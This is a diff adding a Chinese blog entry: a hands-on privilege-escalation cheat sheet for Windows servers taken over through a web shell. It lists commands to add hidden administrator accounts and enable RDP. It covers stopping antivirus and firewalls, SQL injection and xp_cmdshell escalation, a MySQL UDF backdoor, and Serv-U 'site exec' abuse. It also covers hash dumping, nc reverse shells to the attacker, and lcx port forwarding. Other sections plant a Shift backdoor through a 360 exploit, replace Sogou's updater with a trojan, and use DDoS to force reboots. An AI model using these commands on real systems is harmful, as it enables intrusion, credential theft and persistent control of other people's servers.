@@ -105,6 +105,234 @@
       </tags>
   </entry>
   <entry>
+    <title>内网提权小笔记</title>
+    <url>/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83%E5%B0%8F%E7%AC%94%E8%AE%B0/</url>
+    <content><![CDATA[<h1 id="提权笔记"><a href="#提权笔记" class="headerlink" title="提权笔记"></a>提权笔记</h1><h2 id="web提权"><a href="#web提权" class="headerlink" title="**web提权 **"></a>**web提权 **</h2><ol>
+<li><p>能不能执行cmd就看这个命令：net user，net不行就用net1，再不行就上传一个net到可写可读目录，执行&#x2F;c c:windowstempcookiesnet1.exe user</p>
+</li>
+<li><p>当提权成功，3389没开的情况下，上传开3389的vps没成功时，试试上传rootkit.asp 用刚提权的用户登录进去就是system权限，再试试一般就可以了。</p>
+</li>
+<li><p>cmd拒绝访问的话就自己上传一个cmd.exe 自己上传的后缀是不限制后缀的，cmd.exe&#x2F;cmd.com&#x2F;cmd.txt 都可以。</p>
+</li>
+<li><p>cmd命令：systeminfo，看看有没有KB952004、KB956572、KB970483这三个补丁，如果没有，第一个是pr提权，第二个是巴西烤肉提权，第三个是iis6.0提权。</p>
+</li>
+<li><p>c:windowstempcookies 这个目录</p>
+</li>
+<li><p>找sa密码或是root密码，直接利用大马的文件搜索功能直接搜索，超方便！</p>
+</li>
+<li><p>cmd执行exp没回显的解决方法：com路径那里输入exp路径C:RECYCLERpr.exe，命令那里清空(包括&#x2F;c )输入”net user jianmei daxia &#x2F;add”</p>
+</li>
+<li><p>增加用户并提升为管理员权限之后，如果连接不上3389，上传rootkit.asp脚本，访问会提示登录，用提权成功的账号密码登录进去就可以拥有管理员权限了。</p>
+</li>
+<li><p>有时变态监控不让添加用户，可以尝试抓管理哈希值，上传“PwDump7 破解当前管理密码(hash值)”，俩个都上传，执行PwDump7.exe就可以了，之后到网站去解密即可。</p>
+</li>
+<li><p>有时增加不上用户，有可能是密码过于简单或是过于复杂，还有就是杀软的拦截，命令 tasklist 查看进程</p>
+</li>
+<li><p>其实星外提权只要一个可执行的文件即可，先运行一遍cmd，之后把星外ee.exe命名为log.csv 就可以执行了。</p>
+</li>
+<li><p>用wt.asp扫出来的目录，其中红色的文件可以替换成exp，执行命令时cmd那里输入替换的文件路径，下面清空双引号加增加用户的命令。</p>
+</li>
+<li><p>提权很无奈的时候，可以试试TV远控，通杀内外网，穿透防火墙，很强大的。</p>
+</li>
+<li><p>当可读可写目录存在空格的时候，会出现这样的情况：’C:Documents’ 不是内部或外部命令，也不是可运行的程序 或批处理文件。解决办法是利用菜刀的交互shell切换到exp路径，如：Cd C:Documents and SettingsAll UsersApplication DataMicrosoft 目录<br>然后再执行exp或者cmd，就不会存在上面的情况了，aspshell一般是无法跳转目录的～</p>
+</li>
+<li><p>有时候可以添加用户，但是添加不到管理组，有可能是administrators改名了，net user administrator 看下本地组成员，*administrators</p>
+</li>
+<li><p>进入服务器，可以继续内网渗透 这个时候可以尝试打开路由器 默认帐号密码 admin admin</p>
+</li>
+<li><p>有的cmd执行很变态，asp马里，cmd路径填上面，下面填：””c:xxxexp.exe “whoami” 记得前面加两个双引号，不行后面也两个，不行就把exp的路径放在cmd那里，下面不变。</p>
+</li>
+<li><p>一般增加不上用户，或是想添加增加用户的vbs,bat,远控小马到服务器的启动项里，用“直接使服务器蓝屏重启的东东”这个工具可以实现，</p>
+</li>
+<li><p>执行PwDump7.exe抓哈希值的时候，建议重定向结果到保存为1.txt &#x2F;c c:windowstempcookiesPwDump7.exe &gt;1.txt</p>
+</li>
+<li><p>菜刀执行的技巧，上传cmd到可执行目录，右击cmd 虚拟终端，help 然后setp c:windowstempcmd.exe 设置终端路径为：c:windowstempcmd.exe</p>
+</li>
+<li><p>当不支持aspx，或是支持但跨不了目录的时候，可以上传一个读iis的vps，执行命令列出所有网站目录，找到主站的目录就可以跨过去了。<br>上传cscript.exe到可执行目录，接着上传iispwd.vbs到网站根目录，cmd命令&#x2F;c “c:windowstempcookiescscript.exe” d:webiispwd.vbs</p>
+</li>
+<li><p>如何辨别服务器是不是内网？192.168.x.x 172.16.x.x 10.x.x.x</p>
+</li>
+</ol>
+<h2 id="dos命令大全"><a href="#dos命令大全" class="headerlink" title="dos命令大全"></a><strong>dos命令大全</strong></h2><p>查看版本：ver</p>
+<p>查看权限：whoami</p>
+<p>查看配置：systeminfo</p>
+<p>查看用户：net user</p>
+<p>查看进程：tasklist</p>
+<p>查看正在运行的服务：tasklist &#x2F;svc</p>
+<p>查看开放的所有端口：netstat -ano</p>
+<p>查询管理用户名：query user</p>
+<p>查看搭建环境：ftp 127.0.0.1</p>
+<p>查看指定服务的路径：sc qc Mysql</p>
+<p>添加一个用户：net user jianmei daxia.asd &#x2F;add</p>
+<p>提升到管理权限：net localgroup administrators jianmei &#x2F;add</p>
+<p>添加用户并提升权限：net user jianmei daxia.asd &#x2F;add &amp; net localgroup administrators jianmei &#x2F;add</p>
+<p>查看制定用户信息：net user jianmei</p>
+<p>查看所有管理权限的用户：net localgroup administrators</p>
+<p>加入远程桌面用户组：net localgroup “Remote Desktop Users” jianmei &#x2F;add</p>
+<p>突破最大连接数：mstsc &#x2F;admin &#x2F;v:127.0.0.1</p>
+<p>删除用户：net user jianmei &#x2F;del</p>
+<p>删除管理员账户:net user administrator daxia.asd</p>
+<p>更改系统登陆密码：net password daxia.asd</p>
+<p>激活GUEST用户：net user guest &#x2F;active:yes</p>
+<p>开启TELNET服务：net start telnet</p>
+<p>关闭麦咖啡：net stop “McAfee McShield”</p>
+<p>关闭防火墙：net stop sharedaccess</p>
+<p>查看当前目录的所有文件：dir c:windows</p>
+<p>查看制定文件的内容：type c:windows1.asp</p>
+<p>把cmd.exe复制到c:windows的temp目录下并命名为cmd.txt：</p>
+<p>copy c:windowstempcookiescmd.exe c:windowstempcmd.txt</p>
+<p>开3389端口的命令：</p>
+<p>REG ADD HKLMSYSTEMCurrentControlSetControlTerminal” “Server &#x2F;v fDenyTSConnections &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</p>
+<p>查 看补丁：</p>
+<p>dir c:windows&gt;a.txt&amp;(for %i in (KB952004.log KB956572.log KB2393802.log KB2503665.log KB2592799.log KB2621440.log KB2160329.log KB970483.log KB2124261.log KB977165.log KB958644.log) do @type a.txt|@find &#x2F;i “%i”||@echo %i Not Installed!)&amp;del &#x2F;f &#x2F;q &#x2F;a a.txt</p>
+<h3 id="SQL语句直接开启3389"><a href="#SQL语句直接开启3389" class="headerlink" title="SQL语句直接开启3389"></a><strong>SQL语句直接开启3389</strong></h3><p>3389登陆关键注册表位置：</p>
+<p>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\TerminalServer\DenyTSConnections</p>
+<p>其中键值DenyTSConnections 直接控制着3389的开启和关闭，当该键值为0表示3389开启，1则表示关闭。</p>
+<p>而MSSQL的xp_regwrite的存储过程可以对注册进行修改，我们使用这点就可以简单的修改DenyTSConnections键值，从而控制3389的关闭和开启。</p>
+<p>开启3389的SQL语句：</p>
+<p>syue.com&#x2F;xiaohua.asp?id&#x3D;100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server’,’fDenyTSConnections’,’REG_DWORD’,0;–</p>
+<p>关闭3389的SQL语句：</p>
+<p>syue.com&#x2F;xiaohua.asp?id&#x3D;100;exec master.dbo.xp_regwrite’HKEY_LOCAL_MACHINE’,’SYSTEM\CurrentControlSet\Control\Terminal Server ’,’fDenyTSConnections’,’REG_DWORD’,1;–</p>
+<h2 id="常见杀软"><a href="#常见杀软" class="headerlink" title="常见杀软"></a><strong>常见杀软</strong></h2><p>360tray.exe 360实时保护</p>
+<p>ZhuDongFangYu.exe 360主动防御</p>
+<p>KSafeTray.exe 金山卫士</p>
+<p>McAfee McShield.exe 麦咖啡</p>
+<p>SafeDogUpdateCenter.exe 服务器安全狗</p>
+<h2 id="windows提权中敏感目录和敏感注册表的利用"><a href="#windows提权中敏感目录和敏感注册表的利用" class="headerlink" title="windows提权中敏感目录和敏感注册表的利用"></a>windows提权中敏感目录和敏感注册表的利用</h2><h3 id="敏感目录-目录权限-提权用途"><a href="#敏感目录-目录权限-提权用途" class="headerlink" title="敏感目录 目录权限 提权用途"></a>敏感目录 目录权限 提权用途</h3><p>C:Program Files 默认用户组users对该目录拥有查看权 可以查看服务器安装的应用软件<br>C:Documents and SettingsAll Users「开始」菜单程序 Everyone拥有查看权限 存放快捷方式，可以下载文件，属性查看安装路径<br>C:Documents and SettingsAll UsersDocuments Everyone完全控制权限 上传执行cmd及exp<br>C:windowssystem32inetsrv Everyone完全控制权限 上传执行cmd及exp<br>C:windowsmy.iniC:Program FilesMySQLMySQL Server 5.0my.ini 默认用户组users拥有查看权限 安装mysql时会将root密码写入该文件<br>C:windowssystem32 默认用户组users拥有查看权限 Shift后门一般是在该文件夹，可以下载后门破解密码<br>C:Documents and SettingsAll Users「开始」菜单程序启动 Everyone拥有查看权限 可以尝试向该目录写入vbs或bat，服务器重启后运行。<br>C:RECYCLERD:RECYCLER Everyone完全控制权限 回收站目录。常用于执行cmd及exp<br>C:Program FilesMicrosoft SQL Server 默认用户组users对该目录拥有查看权限 收集mssql相关信息，有时候该目录也存在可执行权限<br>C:Program FilesMySQL 默认用户组users对该目录拥有查看权限 找到MYSQL目录中user.MYD里的root密码<br>C:oraclexe 默认用户组users对该目录拥有查看权限 可以尝试利用Oracle的默认账户提权<br>C:WINDOWSsystem32config 默认用户组users对该目录拥有查看权限 尝试下载sam文件进行破解提权<br>C:Program FilesGeme6 FTP ServerRemote AdminRemote.ini 默认用户组users对该目录拥有查看权限 Remote.ini文件中存放着G6FTP的密码<br>c:Program FilesRhinoSoft.comServ-Uc:Program FilesServ-U 默认用户组users对该目录拥有查看权限 ServUDaemon.ini 中存储了虚拟主机网站路径和密码<br>c:windowssystem32inetsrvMetaBase.xml 默认用户组users对该目录拥有查看权限 IIS配置文件<br>C:tomcat5.0confresin.conf 默认用户组users对该目录拥有查看权限 Tomat存放密码的位置<br>C:ZKEYSSetup.ini 默认用户组users对该目录拥有查看权限 ZKEYS虚拟主机存放密码的位置</p>
+<h3 id="提权中的敏感注册表位置"><a href="#提权中的敏感注册表位置" class="headerlink" title="提权中的敏感注册表位置"></a><strong>提权中的敏感注册表位置</strong></h3><p>HKEY_LOCAL_MACHINESOFTWAREMicrosoftMSSQLServerMSSQLServerSuperSocketNetLibTcp Mssql端口<br>HKLMSYSTEMCurrentControlSetControlTerminal Server DenyTSConnections 远程终端 值为0 即为开启<br>HKEY_LOCAL_MACHINESOFTWAREMySQL AB mssql的注册表位置<br>HKEY_LOCAL_MACHINESOFTWAREHZHOSTCONFIG 华众主机注册表配置位置<br>HKEY_LOCAL_MACHINESOFTWARECat SoftServ-UDomains1UserList serv-u的用户及密码（su加密）位置<br>HKEY_LOCAL_MACHINESYSTEMCurrentControlSetControlTerminalServer WinStationsRDP-Tcp 在该注册表位置PortNumber的值即位3389端口值<br>HKEY_CURRENT_USERSoftwarePremiumSoftNavicatServers mysql管理工具Navicat的注册表位置，提权运用请谷歌<br>HKEY_LOCAL_MACHINESYSTEMRAdminv2.0ServerParameters Radmin的配置文件，提权中常将其导出进行进行覆盖提权<br>HKEY_LOCAL_MACHINESYSTEMControlSet002ServicesMSFtpsvcParametersVirtual Roots IIS注册表全版本泄漏用户路径和FTP用户名漏洞<br>HKEY_LOCAL_MACHINEsoftwarehzhostconfigSettingsmastersvrpass 华众主机在注册表中保存的mssql、mysql等密码<br>HKEY_LOCAL_MACHINESYSTEMLIWEIWENSOFTINSTALLFREEADMIN11 星外主机mssql的sa账号密码，双MD5加密<br>HKEY_LOCAL_MACHINESYSTEMControlSet002ServicesMSFtpsvcParametersVirtual RootsControlSet002 星外ftp的注册表位置，当然也包括ControlSet001、ControlSet003</p>
+<h3 id="wscript-shell的删除和恢复"><a href="#wscript-shell的删除和恢复" class="headerlink" title="**wscript.shell的删除和恢复 **"></a>**wscript.shell的删除和恢复 **</h3><p>载wscript.shell对象，在cmd下或直接运行：regsvr32 &#x2F;u %windir%system32WSHom.Ocx</p>
+<p>卸载FSO对象，在cmd下或直接运行：regsvr32.exe &#x2F;u %windir%system32scrrun.dll</p>
+<p>卸载stream对象，在cmd下或直接运行：regsvr32 &#x2F;s &#x2F;u “C:ProgramFilesCommonFilesSystemadomsado15.dll”</p>
+<p>如果想恢复的话只需要去掉&#x2F;U 即可重新再注册以上相关ASP组件，这样子就可以用了</p>
+<h2 id="如何找到准确的终端连接端口"><a href="#如何找到准确的终端连接端口" class="headerlink" title="如何找到准确的终端连接端口"></a><strong>如何找到准确的终端连接端口</strong></h2><p>在aspx大马里，点击“系统信息”第三个就是目前的3389端口</p>
+<p>或是执行命令查看正在运行的服务：tasklist &#x2F;svc</p>
+<p>找到：svchost.exe 1688 TermService</p>
+<p>记住1688这个ID值，</p>
+<p>查看开放的所有端口：netstat -ano</p>
+<p>找到1688这个ID值所对应的端口就是3389目前的端口</p>
+<h2 id="iis6提权提示Can-not-find-wmiprvse-exe的突破方法"><a href="#iis6提权提示Can-not-find-wmiprvse-exe的突破方法" class="headerlink" title="**iis6提权提示Can not find wmiprvse.exe的突破方法 **"></a>**iis6提权提示Can not find wmiprvse.exe的突破方法 **</h2><p>windows2003   iis6</p>
+<p>iis7在windows2008以上</p>
+<ul>
+<li><p>突破方法一：</p>
+<p>在IIS环境下，如果权限做得不严格，我们在aspx大马里面是有权限直接结束wmiprvse.exe进程的，进程查看里面直接K掉</p>
+<p>在结束之后，它会再次运行，这时候的PID值的不一样的。这时候我们回来去运行exp，直接秒杀。</p>
+</li>
+<li><p>突破方法二：</p>
+<p>虚拟主机，一般权限严格限制的，是没权限结束的，这时候我们可以考虑配合其他溢出工具让服务器强制重启，比如“直接使服务器蓝屏重启的东东”</p>
+<p>甚至可以暴力点，DDOS秒杀之，管理发现服务器不通了首先肯定是以为服务器死机，等他重启下服务器（哪怕是IIS重启下）同样秒杀之。</p>
+</li>
+</ul>
+<h2 id="本地溢出提权"><a href="#本地溢出提权" class="headerlink" title="本地溢出提权"></a>本地溢出提权</h2><p>计算机有个地方叫缓存区,程序的缓存区长度是被事先设定好的,如果用户输入的数据超过了这个缓存区的长度,那么这个程序就会溢出了.</p>
+<p>缓存区溢出漏洞主要是由于许多软件没有对缓存区检查而造成的.</p>
+<p>利用一些现成的造成溢出漏洞的exploit通过运行,把用户从users组或其它系统用户中提升到administrators组.</p>
+<p>想要执行cmd命令，就要wscript.shell组建支持，或是支持aspx脚本也行，因为aspx脚本能调用.net组件来执行cmd的命令.</p>
+<h3 id="sa提权-–windows-sqlserver只能用于windows"><a href="#sa提权-–windows-sqlserver只能用于windows" class="headerlink" title="sa提权 –windows sqlserver只能用于windows"></a>sa提权 –windows sqlserver只能用于windows</h3><p>扫描开放的端口，1433开了就可以找sa密码提权，用大马里的搜索文件功能，sa密码一般在conn.asp config.asp web.config 这三个文件也可以通过注册表找配置文件，看下支持aspx不，支持的话跨目录到别的站点上找，找到之后用aspshell自带的sql提权登录再执行命令创建用户即可。</p>
+<p>aspx马提权执行命令有点不一样，点击数据库管理–选MSSQL–server&#x3D;localhost;UID&#x3D;sa;PWD&#x3D;;database&#x3D;master;Provider&#x3D;SQLOLEDB–输入帐号密码连接即可</p>
+<p>增加一个用户：exec master.dbo.xp_cmdshell ‘net user jianmei daxia.asd &#x2F;add’;–<br>提升为管理员：exec master.dbo.xp_cmdshell ‘net localgroup administrators jianmei &#x2F;add’;–</p>
+<p>PS:如果增加不上，说明是xp_cmdshell组建没有，增加xp_cmdshell组建：Use master dbcc addextendedproc(‘xp_cmdshell’,’xplog70.dll’)</p>
+<h3 id="root提权-–windows-x2F-linux"><a href="#root提权-–windows-x2F-linux" class="headerlink" title="root提权 –windows&#x2F;linux"></a>root提权 –windows&#x2F;linux</h3><p>利用mysql提权的前提就是,服务器安装了mysql,mysql的服务没有降权,是默认安装以系统权限继承的(system权限). 并且获得了root的账号密码</p>
+<p>如何判断一台windows服务器上的mysql有没有降权？<br>cmd命令net user 如果存在 mysql mssql这样用户或者类似的.通常就是它的mssql mysql服务已经被降权运行了</p>
+<p>如何判断服务器上是否开启了mysql服务？<br>开了3306端口，有的管理员会把默认端口改掉.另一个判断方法就是网站是否支持php,一般支持的话都是用mysql数据库的.</p>
+<p>如何查看root密码？<br>在mysql的安装目录下找到user.myd这个文件，root就藏在里面，一般是40位cmd加密，一些php网站安装的时候用的是root用户,在conn.asp config.asp这些文件里。<br>有时会显得很乱，这时就需要自己去组合，前17位在第一行可以找到，还有23位在第三行或是其他行，自己继续找。</p>
+<p>可以直接用php脚本里“mysql执行”，或是上传个UDF.php，如果网站不支持PHP，可以去旁一个php的站，也可以把UDF.php上传到别的phpshell上也可以。</p>
+<p>填入帐号密码之后，自然就是安装DLL了，点击“自动安装Mysql BackDoor” 显示导出跟创建函数成功后，紧接着执行增加用户的命令即可。</p>
+<p>注意：5.0版本以下(包括5.0的)默认c:windows系统目录就可以了，5.1版本以上的不能导出到系统目录下创建自定义函数，只能导出在mysql安装目录下的lib&#x2F;plugin目录中</p>
+<p>例如：D:&#x2F;Program Files&#x2F;MySQL&#x2F;MySQL Server 5.1&#x2F;lib&#x2F;plugin&#x2F;mysql.dll</p>
+<p>如果密码看不见，或是组合不到40位，就本地安装一个mysql吧，<br>1、停止mysql服务<br>2、替换下载下来的3个文件（user.MYI user.MYD user.frm）<br>3、cmd切换到bin目录下，进入mysql安全模式，cmd命令：mysqld-nt –skip-grant-tables<br>4、重新打开一个cmd 切换到bin目录下，cmd命令：mysql -u root 版本不同有可能是：mysql -uroot -proot<br>5、最后查询一下就出来了select user,password from mysql.user;</p>
+<h3 id="serv-u提权-–ftp–windows"><a href="#serv-u提权-–ftp–windows" class="headerlink" title="serv-u提权 –ftp–windows"></a>serv-u提权 –ftp–windows</h3><p>这个文件里包含serv-u的md5密码：C:Program FilesRhinoSoft.comServ-U\ServUDaemon.ini</p>
+<p>找到这个文件：ServUDaemon.ini 打开找到：LocalSetupPassword&#x3D;nqFCE64E0056362E8FCAF813094EC39BC2</p>
+<p>再拿md5密文去解密，再用现在的密码登陆提权即可。</p>
+<p>serv-u提权的前提是43958端口开了，且知道帐号密码！</p>
+<p>如果帐号密码默认，直接用shell里面的serv-u提权功能即可搞定，建议用aspx马、php马去提权，因为可以看回显。</p>
+<p>530说明密碼不是默认的,回显330说明成功，900说明密码是默认的……………..</p>
+<p>在程序里找个快捷方式，或是相关的文件进行下载到本地，再查看文件的属性，就可以找到serv-u的安装目录了。</p>
+<p>目录有修改权限之serv-u提权：</p>
+<p>找到serv-u的目录，再找到用户的配置文件ServUDaemon.ini，直接增加一个用户代码，保存！</p>
+<p>接着本地cmd命令：ftp 服务器ip</p>
+<p>回车，输入帐号密码再回车………………….</p>
+<p>接着先试试普通的cmd命令提权，不行的话就使用ftp提权的命令：</p>
+<p>Quote site exec net user jianmei daxia &#x2F;add 增加一个用户</p>
+<p>Quote site exec net localgroup administrators jianmei &#x2F;add 提升到管理员权限</p>
+<p>200 EXEC command successful (TID&#x3D;33). 执行成功的回显信息</p>
+<p>Maintenance&#x3D;System 权限类型多加一行指定新加帐号为系统管理员</p>
+<p>ReloadSettings&#x3D;True 在修改ini文件后需加入此项，这时serv-u会自动刷新配置文件并生效</p>
+<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><p>什么情况下适合转发端口？</p>
+<p>1.服务器是内网，我们无法连接。<br>2.服务器上有防火墙，阻断我们的连接。</p>
+<p>转发端口的前提，我们是外网或是有外网服务器。</p>
+<p>找个可读可写目录上传lcx.exe</p>
+<p>本地cmd命令：lcx.exe -listen 1988 4567 （监听本地1988端口并转发到4567端口）</p>
+<p>接着shell命令：&#x2F;c c:windowstempcookieslcx.exe -slave 本机ip 1988 服务器ip 3389 （把服务器3389端口转发到本地4567端口）</p>
+<p>之后本地连接：127.0.0.1:4567 (如果不想加上:4567的话，本地执行命令的时候，把4567换成3389来执行就行了)</p>
+<p>以上是本机外网情况下操作，接着说下在外网服务器里如何操作：</p>
+<p>上传lxc.exe cmd.exe到服务器且同一目录，执行cmd.exe命令：lcx.exe -listen 1988 4567</p>
+<p>接着在aspxshell里点击端口映射，远程ip改为站点的ip，远端口程填1988，点击映射端口，接着在服务器里连接127.0.0.1:4567就可以了。</p>
+<h2 id="nc反弹提权"><a href="#nc反弹提权" class="headerlink" title="nc反弹提权"></a>nc反弹提权</h2><p>当可以执行net user，但是不能建立用户时，就可以用NC反弹提权试下，特别是内网服务器，最好用NC反弹提权。</p>
+<p>不过这种方法, 只要对方装了防火墙, 或是屏蔽掉了除常用的那几个端口外的所有端口，那么这种方法也失效了….</p>
+<p>找个可读可写目录上传nc.exe cmd.exe</p>
+<p>-l 监听本地入栈信息</p>
+<p>-p port打开本地端口</p>
+<p>-t 以telnet形式应答入栈请求</p>
+<p>-e 程序重定向</p>
+<p>本地cmd执行：nc -vv -l -p 52 进行反弹</p>
+<p>接着在shell里执行命令：c:windowstempnc.exe -vv 服务器ip 999 -e c:windowstempcmd.exe 最好是80或8080这样的端口，被防火墙拦截的几率小很多</p>
+<p>执行成功后本地cmd命令：cd&#x2F; （只是习惯而已）</p>
+<p>接着以telnet命令连接服务器：telnet 服务器ip 999</p>
+<p>回车出现已选定服务器的ip就说明成功了，接着权限比较大了，尝试建立用户！</p>
+<p>坏蛋：<br>本地cmd执行：nc -vv -l -p 52 进行反弹<br>c:windowstempnc.exe -e c:windowstempcmd.exe 服务器ip 52</p>
+<p>低调小飞：<br>shell执行命令c:windowstempnc.exe -l -p 110 -t -e c:windowstempcmd.exe</p>
+<p>一般这样的格式执行成功率很小，不如直接在cmd那里输入：c:windowstempnc.exe 命令这里输入：-vv 服务器ip 999 -e c:windowstempcmd.exe</p>
+<p>这个技巧成功率比上面那个大多了，不单单是nc可以这样，pr这些提权exp也是可以的。</p>
+<h2 id="星外提权–windows"><a href="#星外提权–windows" class="headerlink" title="星外提权–windows"></a><strong>星外提权–windows</strong></h2><p>如何知道是不是星外主机？</p>
+<p>第一：网站物理路径存在“freehost”<br>第二：asp马里点击程序，存在“7i24虚拟主机管理平台”“星外主机”之类的文件夹</p>
+<p>默认帐号：freehostrunat<br>默认密码：fa41328538d7be36e83ae91a78a1b16f!7</p>
+<p>freehostrunat这个用户是安装星外时自动建立的，已属于administrators管理组，而且密码不需要解密，直接登录服务器即可</p>
+<p>星外常写目录：</p>
+<p>C:RECYCLER<br>C:windowstemp<br>e:recycler<br>f:recycler<br>C:phpPEAR<br>C:WINDOWS7i24.comFreeHost<br>C:phpdev<br>C:System Volume Information<br>C:7i24.comserverdoctorlog<br>C:WINDOWSTemp<br>c:windowshchiblis.ibl<br>C:7i24.comiissafelog<br>C:7i24.comLinkGatelog<br>C:Program FilesThunder NetworkThunder7<br>C:Program FilesThunder NetworkThunder<br>C:Program FilesSymantec AntiVirusSAVRT<br>c:windowsDriverPacksCAM2<br>C:Program FilesFlashFXP<br>c:Program FilesMicrosoft SQL Server90SharedErrorDumps<br>C:Program FilesZendZendOptimizer-3.3.0<br>C:Program FilesCommon Files<br>c:Documents and SettingsAll UsersApplication DataHagel TechnologiesDU Meterlog.csv<br>c:Program Files360360SafedeepscanSectionmutex.db<br>c:Program FilesHeliconISAPI_Rewrite3error.log<br>c:Program FilesHeliconISAPI_Rewrite3Rewrite.log<br>c:Program FilesHeliconISAPI_Rewrite3httpd.conf<br>c:Program FilesCommon FilesSymantec SharedPersist.bak<br>c:Program FilesCommon FilesSymantec SharedValidate.dat<br>c:Program FilesCommon FilesSymantec SharedValidate.dat<br>C:Program FilesZendZendOptimizer-3.3.0docs<br>C:Documents and SettingsAll UsersDRM<br>C:Documents and SettingsAll UsersApplication DataMcAfeeDesktopProtection<br>C:Documents and SettingsAll UsersApplication Data360safesoftmgr<br>C:Program FilesZendZendOptimizer-3.3.0libOptimizer-3.3.0php-5.2.xZendOptimizer.dll<br>C:Documents and SettingsAll UsersApplication DataMicrosoftMedia Index</p>
+<h2 id="ee提权法："><a href="#ee提权法：" class="headerlink" title="ee提权法："></a>ee提权法：</h2><p>找个可读可写目录上传ee.exe</p>
+<p>cmd命令：&#x2F;c c:windowstempcookiesee.exe -i （获取星外帐号的id值，例如回显：FreeHost ID：724）</p>
+<p>接着命令：&#x2F;c c:windowstempcookiesee.exe -u 724 （获取星外的帐号密码）</p>
+<h2 id="vbs提权法："><a href="#vbs提权法：" class="headerlink" title="vbs提权法："></a>vbs提权法：</h2><p>找个可读可写目录上传cscript.exe iispwd.vbs</p>
+<p>cmd命令：&#x2F;c “c:windowstempcookiescscript.exe” c:windowstempcookiesiispwd.vbs</p>
+<p>意思是读取iis，这样一来，不但可以获取星外的帐号密码，还可以看到同服务器上的所有站点的目录。</p>
+<p>可行思路大全：</p>
+<p>经测试以下目录中的文件权限均为everyone，可以修改，可以上传同文件名替换，删除，最重要的是还可以执行：</p>
+<p>360杀毒db文件替换:<br>c:Program Files360360SDdeepscanSectionmutex.db<br>c:Program Files360360SafedeepscanSectionmutex.db<br>C:Program Files360360SafeAntiSectionmutex.db</p>
+<p>IISrewrite3 文件替换：<br>C:Program FilesHeliconISAPI_Rewrite3Rewrite.log<br>C:Program FilesHeliconISAPI_Rewrite3httpd.conf<br>C:Program FilesHeliconISAPI_Rewrite3error.log</p>
+<p>诺顿杀毒文件替换:<br>c:Program FilesCommon FilesSymantec SharedPersist.bak<br>c:Program FilesCommon FilesSymantec SharedValidate.dat<br>c:Program FilesCommon FilesSymantec SharedPersist.Dat</p>
+<p>一流过滤相关目录及文件：<br>C:7i24.comiissafelogstartandiischeck.txt<br>C:7i24.comiissafelogscanlog.htm</p>
+<p>其他:<br>Zend文件替换：C:Program FilesZendZendOptimizer-3.3.0libOptimizer-3.3.0php-5.2.xZendOptimizer.dll<br>华盾文件替换：C:WINDOWShchiblis.ibl<br>Flash文件替换：C:WINDOWSsystem32MacromedFlashFlash10q.ocx<br>DU Meter流量统计信息日志文件替换：c:Documents and SettingsAll UsersApplication DataHagel TechnologiesDU Meterlog.csv</p>
+<h2 id="360提权–windows"><a href="#360提权–windows" class="headerlink" title="360提权–windows"></a><strong>360提权–windows</strong></h2><p>找个可读可写目录上传360.exe</p>
+<p>cmd命令：&#x2F;c c:windowstempcookies360.exe</p>
+<p>会提示3段英文：</p>
+<p>360 Antivirus Privilege Escalation Exploit By friddy 2010.2.2</p>
+<p>You will get a Shift5 door!</p>
+<p>Shift5 Backdoor created! </p>
+<p>这是成功的征兆，接着连接服务器连按5下shift键，将弹出任务管理器，点击新建任务：explorer.exe 会出现桌面，接下来大家都会弄了……</p>
+<h2 id="搜狗提权–windows"><a href="#搜狗提权–windows" class="headerlink" title="搜狗提权–windows"></a><strong>搜狗提权–windows</strong></h2><p>搜狗的目录默认是可读可写的，搜狗每隔一段时间就会自动升级，而升级的文件是pinyinup.exe</p>
+<p>我们只要把这个文件替换为自己的远控木马，或是添加账户的批处理，等搜狗升级的时候，就可以达成我们的目的了。</p>
+<h2 id="华众虚拟主机提权–windows"><a href="#华众虚拟主机提权–windows" class="headerlink" title="华众虚拟主机提权–windows"></a><strong>华众虚拟主机提权–windows</strong></h2><p>就经验来说，一般溢出提权对虚拟主机是无果的，而且华众又没有星外那么明显的漏洞。</p>
+<p>所以华众提权关键之处就是搜集信息，主要注册表位置：</p>
+<p>HKEY_LOCAL_MACHINESOFTWAREHZHOSTCONFIG<br>HKEY_LOCAL_MACHINEsoftwarehzhostconfigsettingsmysqlpass root密码<br>HKEY_LOCAL_MACHINEsoftwarehzhostconfigsettingsmssqlpss sa 密码</p>
+<p>c:windowstemp 下有hzhost主机留下的ftp登陆记录有用户名和密码</p>
+<p>以上信息配合hzhosts华众虚拟主机系统6.x 破解数据库密码工具使用</p>
+<p>百度搜索：hzhosts华众虚拟主机系统6.x 破解数据库密码工具</p>
+<h2 id="N点虚拟主机–windows"><a href="#N点虚拟主机–windows" class="headerlink" title="N点虚拟主机–windows"></a><strong>N点虚拟主机–windows</strong></h2><p>N点虚拟主机管理系统默认数据库地址为：host_date#host # date#.mdb</p>
+<p>rl直接输入不行 这里咱们替换下 #&#x3D;# 空格&#x3D;</p>
+<p>修改后的下载地址为&#x2F;host_date&#x2F;#host # date#196.mdb</p>
+<p>N点数据库下载之后找到sitehost表 FTPuser&amp;FTPpass 值 FTPpass是N点加密数据然后用N点解密工具解密得到FTP密码</p>
+<p>N点默认安装路径C:Program FilesNpointSoftnpointhostweb<br>D:Program FilesNpointSoftnpointhostweb<br>默认权限可读。遇到对方所用虚拟主机是N点时候 可以考虑 读取该文件夹下载数据库</p>
+]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>Windows</tag>
+        <tag>内网渗透</tag>
+        <tag>Linux</tag>
+        <tag>后渗透</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>应急响应分析排查学习</title>
     <url>/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%88%86%E6%9E%90%E6%8E%92%E6%9F%A5%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0200713/</url>
     <content><![CDATA[<h1 id="应急响应分析排查简单学习200713"><a href="#应急响应分析排查简单学习200713" class="headerlink" title="应急响应分析排查简单学习200713"></a>应急响应分析排查简单学习200713</h1><h2 id="Windows分析排查"><a href="#Windows分析排查" class="headerlink" title="Windows分析排查"></a>Windows分析排查</h2><h3 id="文件分析——开机启动文件"><a href="#文件分析——开机启动文件" class="headerlink" title="文件分析——开机启动文件"></a>文件分析——开机启动文件</h3><p>一般情况下恶意文件都会在开机自启，</p>
@@ -215,6 +443,73 @@
